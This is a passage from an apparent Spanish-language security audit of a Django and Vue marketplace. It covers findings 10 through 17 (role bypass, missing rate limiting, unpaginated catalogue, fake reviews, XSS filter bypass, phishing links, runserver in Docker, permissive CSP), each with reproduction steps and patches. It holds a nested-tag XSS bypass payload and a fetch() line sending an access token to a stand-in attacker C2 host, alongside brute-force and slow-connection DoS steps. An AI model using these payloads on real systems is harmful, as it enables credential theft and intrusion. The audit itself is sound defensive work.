- **`backend/apps/accounts/permissions.py:18`**: UserRol.objects.filter(user=request.user, rol__nombre='SELLER', activo=True).exists() ejecutado independientemente de request.user.role.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** MEDIUM — Ocurre siempre que se modifique o revoque el rol de un usuario en la plataforma.
- **Impacto:** MEDIUM — Bypass de control de acceso RBAC y retencion indebida de privilegios administrativos/vendedor.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Usuario que fue degradado de Vendedor a Comprador por administracion pero retiene privilegios de gestion.
- **Cargas / Payloads:** `POST /api/v1/products/ con cabecera de autorizacion del usuario degradado.`
- **Instrucciones:**
  1. Crear un usuario con rol de vendedor (se crea registro activo en UserRol).
  2. Administrador cambia user.role a 'BUYER' en el modelo de usuario.
  3. Usuario realiza peticion POST a /api/v1/products/ para crear un producto.
  4. Verificar autorizacion en IsSellerOrAdmin.
- **Resultado Observado:** IsSellerOrAdmin retorna True porque UserRol permanece activo, permitiendo crear productos a un comprador.

#### Remediación y Parche Sugerido:
**Estrategia:** Unificar la verificacion de roles en 'user.role' o implementar senales (post_save en User) que actualicen y sincronicen atomicamente los registros de UserRol.

**Archivo:** `backend/apps/accounts/permissions.py`
```python
class IsSellerOrAdmin(BasePermission):
    def has_permission(self, request, view):
        if not request.user or not request.user.is_authenticated:
            return False
        return request.user.role in [User.ROLE_SELLER, User.ROLE_ADMIN] or request.user.is_staff
```

---

## 11. [MEDIUM] `auth.throttling.missing-rate-limiting-login-register`
### Ausencia de limitacion de tasa (Rate Limiting / Throttling) en endpoints criticos de autenticacion

**Descripción del Problema:**  
La configuracion de Django REST Framework en backend/config/settings.py carece de la seccion DEFAULT_THROTTLE_CLASSES y DEFAULT_THROTTLE_RATES. Asimismo, las vistas LoginAPIView y RegisterAPIView en backend/apps/accounts/views.py no definen throttle_classes. Esto permite a un actor malicioso realizar millones de solicitudes de inicio de sesion automatizadas (fuerza bruta y credential stuffing) y de registro masivo de cuentas sin restricciones de frecuencia por IP ni por cuenta, provocando ademas denegacion de servicio por agotamiento de CPU debido al costo computacional del hash PBKDF2 SHA256.

**Causa Raíz en Código:**  
Omision de configuracion de throttling en settings de DRF y vistas de cuentas (backend/config/settings.py:177-188 y backend/apps/accounts/views.py:14,38).

**Comportamiento Esperado:**  
Los endpoints de login y registro deben aplicar limites estrictos de tasa (ej. 5 peticiones por minuto por IP para login, 3 por minuto para registro).

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/accounts/views.py:15`** (`LoginAPIView.post`): Se recibe una peticion de autenticacion HTTP POST.
- `[PROPAGATION]` **`backend/config/settings.py:180`** (`REST_FRAMEWORK`): REST_FRAMEWORK no contiene DEFAULT_THROTTLE_CLASSES ni configuracion de rate limiting.
- `[SINK]` **`backend/apps/accounts/views.py:28`** (`LoginAPIView.post`): Se procesa el hash de contrasena y consulta de base de datos de manera ilimitada para cualquier volumen de peticiones.

#### Evidencia Directa:
- **`backend/config/settings.py:180`**: REST_FRAMEWORK diccionario carece de configuracion de throttling de DRF.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Herramientas automatizadas de fuerza bruta estan ampliamente disponibles y son faciles de ejecutar.
- **Impacto:** MEDIUM — Compromiso de cuentas mediante ataques de diccionario y sobrecarga de CPU por computo de PBKDF2.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Atacante remoto ejecutando un ataque automatizado de credential stuffing con diccionario de contrasenas.
- **Cargas / Payloads:** `Bucle de 1000 solicitudes consecutivas POST /api/v1/auth/login/`
- **Instrucciones:**
  1. Enviar una rafaga de 100 solicitudes de inicio de sesion con credenciales invalidas hacia /api/v1/auth/login/.
  2. Monitorear los codigos de respuesta HTTP retornados por el servidor.
- **Resultado Observado:** Las 100 solicitudes son procesadas retornando 401 Unauthorized sin ninguna respuesta HTTP 429 Too Many Requests.

#### Remediación y Parche Sugerido:
**Estrategia:** Habilitar AnonRateThrottle y UserRateThrottle en REST_FRAMEWORK settings y aplicar ScopedRateThrottle en LoginAPIView y RegisterAPIView.

**Archivo:** `backend/config/settings.py`
```python
REST_FRAMEWORK['DEFAULT_THROTTLE_CLASSES'] = [
    'rest_framework.throttling.AnonRateThrottle',
    'rest_framework.throttling.UserRateThrottle'
]
REST_FRAMEWORK['DEFAULT_THROTTLE_RATES'] = {
    'anon': '100/day',
    'user': '1000/day',
    'login': '5/minute',
    'register': '3/minute'
}
```

---

## 12. [MEDIUM] `catalog.products.unpaginated-resource-exhaustion`
### Agotamiento de memoria y recursos en endpoint publico de catalogo no paginado (OWASP API4:2023)

**Descripción del Problema:**  
En ProductListCreateView el metodo GET no implementa paginacion de resultados. Aunque en settings.py se define PAGE_SIZE = 12, la clase hereda de APIView (no de ListAPIView), por lo que DRF no aplica paginacion automatica. La vista serializa la totalidad del catalogo mediante ProductSerializer(queryset, many=True). En un catalogo con gran volumen de productos y galerias de imagenes, una solicitud no autenticada fuerza la serializacion masiva en memoria provocando latencias severas o saturacion de RAM en el servidor.

**Causa Raíz en Código:**  
Uso de rest_framework.views.APIView con serializacion directa de Product.objects.all() sin paginador ni limite de registros (apps/products/views.py:37-101).

**Comportamiento Esperado:**  
El catalogo debe implementar paginacion obligatoria basada en paginas o cursores, retornando un maximo estricto de productos por pagina (por ejemplo 12 o 24) independientemente del tamano total del inventario.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/products/views.py:37`** (`ProductListCreateView.get`): Peticion GET no autenticada recibida en /api/v1/products/.
- `[PROPAGATION]` **`backend/apps/products/views.py:38`** (`ProductListCreateView.get`): Se genera un queryset sin limite con Product.objects.select_related(...).all().
- `[SINK]` **`backend/apps/products/views.py:92`** (`ProductListCreateView.get`): ProductSerializer(queryset, many=True) procesa e instancia en memoria la totalidad de los registros de la base de datos.

#### Evidencia Directa:
- **`backend/apps/products/views.py:92`**: serializer = ProductSerializer(queryset, many=True) invocado sobre el conjunto total sin paginador.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Cualquier cliente web o script automatizado puede invocar el endpoint sin autenticacion.
- **Impacto:** MEDIUM — Degradacion de rendimiento y riesgo de bloqueo por Out-Of-Memory en despliegues con catalogos voluminosos.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Un atacante realiza multiples peticiones concurrentes a /api/v1/products/ para saturar la memoria del proceso Django y agotar el pool de conexiones de base de datos.
- **Cargas / Payloads:** `GET /api/v1/products/ HTTP/1.1`
- **Instrucciones:**
  1. Enviar una peticion HTTP GET simple a /api/v1/products/.
  2. Medir el payload de respuesta y el tiempo de serializacion en el servidor.
  3. Observar que el JSON contiene todos los productos existentes sin cabeceras ni enlaces de paginacion (next/previous).
- **Resultado Observado:** La respuesta devuelve todos los registros existentes sin paginar, consumiendo ancho de banda y memoria del worker proporcional a la cantidad total de filas.

#### Remediación y Parche Sugerido:
**Estrategia:** Incorporar PageNumberPagination de Django REST Framework en la vista o migrar la vista a ListAPIView para forzar la entrega segmentada por paginas.

**Archivo:** `backend/apps/products/views.py`
```python
from rest_framework.pagination import PageNumberPagination

paginator = PageNumberPagination()
paginator.page_size = 12
page = paginator.paginate_queryset(queryset, request)
serializer = ProductSerializer(page, many=True)
return paginator.get_paginated_response(serializer.data)
```

---

## 13. [MEDIUM] `catalog.reviews.unrestricted-fraudulent-reviews`
### Manipulacion de reputacion y resenas fraudulentas sin verificacion de compra previa

**Descripción del Problema:**  
En ProductReviewView cualquier usuario registrado puede emitir un numero ilimitado de evaluaciones sobre cualquier producto del catalogo. El sistema no valida si el usuario adquirio el producto en una orden autorizada, ni si el evaluador es el propio vendedor del producto (autofavoritismo), y el modelo ProductReview carece de restriccion unica entre producto y usuario. Esto permite a un actor malicioso inflar fraudulentamente la calificacion de sus productos o destruir la reputacion de vendedores competidores.

**Causa Raíz en Código:**  
Falta de validacion de compra previa en ProductReviewView.post (apps/products/views.py:227-253) y ausencia de unique_together = ("product", "user_profile") en el modelo ProductReview (apps/products/models.py:141-171).

**Comportamiento Esperado:**  
Solo los clientes que hayan comprado el producto mediante una orden con estado AUTHORIZED deben poder calificarlo, permitiendo una unica resena por producto y usuario, y bloqueando explicitamente que el vendedor evalue sus propios productos.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/products/views.py:227`** (`ProductReviewView.post`): Usuario autenticado envia una resena con calificacion a POST /api/v1/products/:lookup/reviews/.
- `[PROPAGATION]` **`backend/apps/products/views.py:237`** (`ProductReviewView.post`): La vista crea la resena sin consultar el modelo Order ni verificar si el usuario es el dueno de la publicacion.
- `[SINK]` **`backend/apps/products/models.py:160`** (`ProductReview.save`): El metodo save() recalcula inmediatamente el promedio de calificacion y conteo de resenas del producto alterando su reputacion publica.

#### Evidencia Directa:
- **`backend/apps/products/views.py:237`**: Creacion directa de ProductReview sin verificar ordenes de compra previas del usuario.
- **`backend/apps/products/models.py:153`**: Meta de ProductReview carece de unique_together = ("product", "user_profile").

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Cualquier usuario con cuenta registrada puede invocar el endpoint sin requerir privilegios elevados.
- **Impacto:** MEDIUM — Corrupcion deliberada de la reputacion comercial del marketplace y fraude hacia los consumidores.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Un vendedor crea multiples cuentas o utiliza una cuenta propia para enviar cientos de valoraciones de 5 estrellas a sus productos y valoraciones de 1 estrella a la competencia.
- **Cargas / Payloads:** `{"rating": 5, "comment": "Excelente producto recomendado"}`
- **Instrucciones:**
  1. Autenticarse como usuario normal.
  2. Enviar 10 peticiones POST consecutivas a /api/v1/products/<slug>/reviews/ con rating 5.
  3. Consultar GET /api/v1/products/<slug>/reviews/ y comprobar que se crearon 10 reviews del mismo usuario y subio el rating del producto.
- **Resultado Observado:** El endpoint acepta todas las evaluaciones repetidas y recalcula dinamicamente el promedio del producto favoreciendo o perjudicando a cualquier publicacion.

#### Remediación y Parche Sugerido:
**Estrategia:** Agregar unique_together en ProductReview y verificar en ProductReviewView que el usuario posea una orden en estado AUTHORIZED que contenga el producto antes de admitir la evaluacion.

**Archivo:** `backend/apps/products/views.py`
```python
if product.seller_profile == user_profile:
    return Response({"status": "fail", "message": "No puedes evaluar tus propios productos."}, status=400)
has_purchased = OrderItem.objects.filter(order__buyer_profile=user_profile, order__status="AUTHORIZED", product=product).exists()
if not has_purchased:
    return Response({"status": "fail", "message": "Debes haber comprado este producto para evaluarlo."}, status=403)
```

---

## 14. [MEDIUM] `frontend.security.single-pass-xss-sanitization-bypass`
### Evasion de filtro de sanitizacion XSS por reemplazo en una sola pasada en sanitizeInput

**Descripción del Problema:**  
En 'frontend/src/utils/security.js', la funcion 'sanitizeInput' intenta neutralizar ataques XSS ejecutando una unica pasada de reemplazo con expresiones regulares: 'sanitized = sanitized.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "")'. Esta tecnica de sanitizacion recursiva ingenua es vulnerable a payloads anidados o interpolados (como '<scr<script>ipt>alert(1)</script>'), donde la remocion de la etiqueta interior reconstruye la etiqueta maliciosa exterior al colapsar los caracteres circundantes.

**Causa Raíz en Código:**  
Sanitizacion mediante expresion regular no recursiva en una sola pasada (frontend/src/utils/security.js:21-27, 53-64).

**Comportamiento Esperado:**  
Para sanitizacion HTML segura se debe utilizar una libreria robusta como DOMPurify o codificar entidades HTML de forma consistente.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`frontend/src/utils/security.js:53`** (`sanitizeInput`): Se recibe una cadena con etiquetas script anidadas.
- `[SINK]` **`frontend/src/utils/security.js:57`** (`sanitizeInput`): replace() elimina la etiqueta interna, dejando formada una etiqueta <script> valida en la salida sanitizada.

#### Evidencia Directa:
- **`frontend/src/utils/security.js:57`**: sanitized = sanitized.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, ''); se ejecuta una sola vez.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** MEDIUM — La tecnica de evasion de etiquetas anidadas es ampliamente conocida en pruebas de penetracion.
- **Impacto:** MEDIUM — Invalida la promesa de sanitizacion del utilitario de seguridad si el resultado se inyecta en el DOM.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Atacante que ingresa etiquetas anidadas para evadir el filtro XSS del cliente.
- **Cargas / Payloads:** `<scr<script>ipt>alert(1)</script>`
- **Instrucciones:**
  1. Invocar sanitizeInput('<scr<script>ipt>alert(1)</script>').
  2. Inspeccionar la cadena resultante devuelta por la funcion.
- **Resultado Observado:** La cadena devuelta es '<script>alert(1)', conservando la estructura de etiqueta de script.

#### Remediación y Parche Sugerido:
**Estrategia:** Utilizar la libreria estandar DOMPurify o codificar estrictamente los caracteres especiales HTML (<, >, &, ", ').

**Archivo:** `frontend/src/utils/security.js`
```javascript
export const sanitizeInput = (input) => {
  if (!input || typeof input !== 'string') return '';
  return input.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
};
```

---

## 15. [MEDIUM] `frontend.store.unvalidated-external-link-phishing`
### Enlace externo arbitrario no validado en Tiendas Oficiales (Riesgo de Phishing / Redireccion abierta)

**Descripción del Problema:**  
En 'frontend/src/components/ProductCleanUrlView.vue:254-262', cuando un producto pertenece a una tienda oficial, se renderiza un enlace hacia el sitio web del vendedor: '<a :href="store.website" target="_blank" rel="noopener noreferrer">Visitar Tienda Oficial</a>'. En el backend ('backend/apps/accounts/views.py:113'), el campo 'website' de RegisterStoreAPIView no valida que la URL pertenezca a un protocolo seguro (https://) ni valida el dominio contra listas de dominios permitidos o bloqueados. Un vendedor fraudulento puede registrar URLs engañosas (ej. sitios clonados de bancos o malware) que los compradores visitaran confiando en la insignia de 'Tienda Oficial'.

**Causa Raíz en Código:**  
Renderizado directo de URL externa no saneada con esquema arbitrario (frontend/src/components/ProductCleanUrlView.vue:254 y backend/apps/accounts/views.py:113).

**Comportamiento Esperado:**  
El campo website debe validar estrictamente que la URL use HTTPS y pasar por una pagina intermedia de advertencia de redireccion externa.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/accounts/views.py:113`** (`RegisterStoreAPIView.post`): Se almacena la URL de website suministrada por el usuario sin validacion estricta.
- `[SINK]` **`frontend/src/components/ProductCleanUrlView.vue:258`** (`template`): Se enlaza directamente :href="store.website" en la vista de detalle de producto con insignia oficial.

#### Evidencia Directa:
- **`frontend/src/components/ProductCleanUrlView.vue:258`**: <a :href="product.store.website" target="_blank" rel="noopener noreferrer"> enlaza URL sin verificar protocolo ni dominio.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** MEDIUM — Cualquier usuario con rol de vendedor puede registrar una tienda y configurar el sitio web.
- **Impacto:** MEDIUM — Fraude financiero, robo de credenciales mediante phishing a los clientes del marketplace.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Vendedor malicioso que registra una tienda oficial con website apuntando a un portal de phishing.
- **Cargas / Payloads:** `https://phishing-banco-clonado.example.com`
- **Instrucciones:**
  1. Registrar una tienda oficial con website 'https://phishing-banco-clonado.example.com'.
  2. Publicar un producto.
  3. Abrir la vista del producto como comprador y presionar 'Visitar Tienda Oficial'.
- **Resultado Observado:** El navegador abre directamente el sitio malicioso en una nueva pestana bajo la apariencia de respaldo de la plataforma.

#### Remediación y Parche Sugerido:
**Estrategia:** Validar en backend que website comience estrictamente con 'https://' y agregar advertencia de salida en frontend.

**Archivo:** `frontend/src/components/ProductCleanUrlView.vue`
```yaml
<a :href="safeStoreWebsite" @click="confirmExternalRedirect($event, product.store.website)" target="_blank" rel="noopener noreferrer">
```

---

## 16. [MEDIUM] `infra.docker.insecure-django-runserver-production`
### Uso inseguro del servidor de desarrollo Django (runserver) en Dockerfile, compose y scripts

**Descripción del Problema:**  
En 'docker-compose.yml:27', 'backend/Dockerfile:20' y el script 'iniciar_servicios.sh:17', el comando de ejecucion del backend utiliza 'python manage.py runserver 0.0.0.0:8000'. La documentacion oficial de Django advierte enfaticamente que 'runserver' es unicamente para pruebas locales: no ha sido auditado para seguridad, carece de manejo de concurrencia eficiente y es vulnerable a ataques de denegacion de servicio por agotamiento de conexiones (Slowloris / SYN flood). Desplegar la aplicacion con este comando en produccion degrada la seguridad y estabilidad global.

**Causa Raíz en Código:**  
Invocacion de manage.py runserver en imagenes y contenedores de despliegue (docker-compose.yml:27 y backend/Dockerfile:20).

**Comportamiento Esperado:**  
Los contenedores de backend deben iniciar con un servidor WSGI/ASGI endurecido como Gunicorn o Uvicorn.

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/Dockerfile:20`** (`CMD`): Se define el comando de arranque del contenedor con manage.py runserver.
- `[SINK]` **`docker-compose.yml:27`** (`services.backend.command`): Se ejecuta runserver enlazado a 0.0.0.0:8000.

#### Evidencia Directa:
- **`docker-compose.yml:27`**: command: python manage.py runserver 0.0.0.0:8000 ejecuta el servidor de desarrollo.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** HIGH — Es la configuracion por defecto suministrada en el repositorio para arrancar los servicios.
- **Impacto:** MEDIUM — Denegacion de servicio y exposicion de informacion interna en caso de fallos no controlados.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Atacante que realiza conexiones TCP lentas o multiples peticiones concurrentes para saturar el servidor.
- **Cargas / Payloads:** `Envio de peticiones concurrentes mediante ab o wrk hacia el puerto 8000.`
- **Instrucciones:**
  1. Levantar el servicio con docker-compose up backend.
  2. Enviar 50 conexiones HTTP simultaneas con paquetes incompletos.
  3. Monitorear el tiempo de respuesta para usuarios legitimos.
- **Resultado Observado:** El servidor de desarrollo monohilo/multiproc basico se bloquea o eleva su latencia a varios segundos.

#### Remediación y Parche Sugerido:
**Estrategia:** Instalar gunicorn en requirements.txt y modificar el CMD de Dockerfile y compose para ejecutar 'gunicorn config.wsgi:application --bind 0.0.0.0:8000 --workers 4'.

**Archivo:** `backend/Dockerfile`
```yaml
CMD ["gunicorn", "config.wsgi:application", "--bind", "0.0.0.0:8000", "--workers", "4"]
```

---

## 17. [MEDIUM] `security.middleware.csp-wildcard-data-exfiltration`
### Politica CSP permisiva con comodin https: permite exfiltracion global de datos sensibles

**Descripción del Problema:**  
En 'backend/apps/security/middleware.py:22-30', el middleware 'ISO27001SecurityHeadersMiddleware' construye la directiva Content-Security-Policy (CSP) incluyendo 'connect-src' e 'img-src' con el comodin 'https:'. En caso de que se produzca una vulnerabilidad XSS o una inyeccion en una libreria de terceros en el frontend, el navegador permitira realizar solicitudes HTTP de red ('fetch', 'XMLHttpRequest', 'sendBeacon') y cargar recursos hacia cualquier servidor externo en internet que opere sobre HTTPS. Esto anula la capacidad del CSP de contener la exfiltracion de tokens de autenticacion, credenciales y datos de tarjetas.

**Causa Raíz en Código:**  
Uso de 'https:' como comodin en directivas connect-src e img-src de la cabecera CSP (backend/apps/security/middleware.py:25-27).

**Comportamiento Esperado:**  
La directiva CSP connect-src debe restringir las conexiones salientes exclusivamente a 'self' y a las APIs especificas autorizadas (ej. transbank.cl).

#### Traza de Propagación (Source-to-Sink):
- `[ENTRYPOINT]` **`backend/apps/security/middleware.py:13`** (`ISO27001SecurityHeadersMiddleware.__call__`): Se intercepta la respuesta HTTP para inyectar cabeceras de seguridad.
- `[SINK]` **`backend/apps/security/middleware.py:26`** (`ISO27001SecurityHeadersMiddleware.__call__`): Se establece connect-src 'self' https: permitiendo llamadas de red hacia cualquier host HTTPS del mundo.

#### Evidencia Directa:
- **`backend/apps/security/middleware.py:26`**: "connect-src 'self' http://localhost:* ws://localhost:* https:;" incluye comodin https:.

#### Evaluación de Riesgo y Severidad:
- **Probabilidad:** MEDIUM — La politica permisiva esta activa de forma predeterminada en todas las respuestas del backend.
- **Impacto:** MEDIUM — Facilita la exfiltracion no autorizada de datos y comunicacion con infraestructura atacante.
- **Severidad Global:** **MEDIUM**

#### Reproducción Delimitada y Segura:
- **Perspectiva del Actor:** Script malicioso o dependencia comprometida intentando enviar datos a un servidor de comando y control (C2).
- **Cargas / Payloads:** `fetch('https://c2-servidor-atacante.com/exfiltrate?token=' + localStorage.getItem('access_token'))`
- **Instrucciones:**
  1. Obtener las cabeceras HTTP de una peticion hacia la API.
  2. Inspeccionar la cabecera Content-Security-Policy retornada.
  3. Verificar directiva connect-src en la consola de herramientas de desarrollo del navegador.
- **Resultado Observado:** El navegador permite solicitudes fetch hacia cualquier dominio HTTPS externo debido al comodin https:.

#### Remediación y Parche Sugerido:
**Estrategia:** Remover el comodin 'https:' de connect-src e img-src, declarando unicamente los dominios estrictamente necesarios.

**Archivo:** `backend/apps/security/middleware.py`
```python
"connect-src 'self' https://webpay3gint.transbank.cl https://webpay3g.transbank.cl;"
```

---
